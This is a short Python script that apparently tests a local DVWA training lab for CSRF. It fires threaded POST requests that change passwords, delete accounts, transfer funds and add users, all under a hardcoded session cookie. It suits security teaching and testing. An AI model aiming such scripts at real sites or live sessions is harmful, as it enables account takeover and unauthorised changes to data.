import requests
import threading
import time

# Configuration
base_url = "http://127.0.0.1/DVWA/"
vuln_url = base_url + "vulnerable-endpoint"

# Headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'PHPSESSID=rkg47evun26n2jg6vjhrg3vlk8; security=low',
}

# CSRF Test Scenarios
csrf_scenarios = [
    {"action": "update_profile", "new_email": "csrf_test1@example.com"},
    {"action": "change_password", "old_password": "password", "new_password": "csrf123"},
    {"action": "delete_account", "confirm": "yes"},
    {"action": "transfer_funds", "amount": "1000", "to_account": "123456"},
    {"action": "post_comment", "comment": "This is a CSRF test comment."},
    {"action": "add_user", "username": "csrfuser", "password": "csrfpass"},
    {"action": "update_settings", "setting1": "value1", "setting2": "value2"},
    {"action": "upload_file", "file": "csrf_file.txt", "content": "CSRF file content"},
    {"action": "send_message", "to_user": "admin", "message": "This is a CSRF test message"},
    {"action": "subscribe_newsletter", "email": "csrf_subscriber@example.com"}
]

def test_csrf(params):
    response = requests.post(vuln_url, headers=headers, data=params)
    print(f"Testing CSRF with parameters: {params}")
    print(f"Response: {response.text}")

def threaded_csrf_test(scenarios):
    threads = []
    for scenario in scenarios:
        t = threading.Thread(target=test_csrf, args=(scenario,))
        t.start()
        threads.append(t)
        time.sleep(0.1)  # Small delay to avoid overwhelming the server

    for t in threads:
        t.join()

def main():
    threaded_csrf_test(csrf_scenarios)

if __name__ == "__main__":
    main()
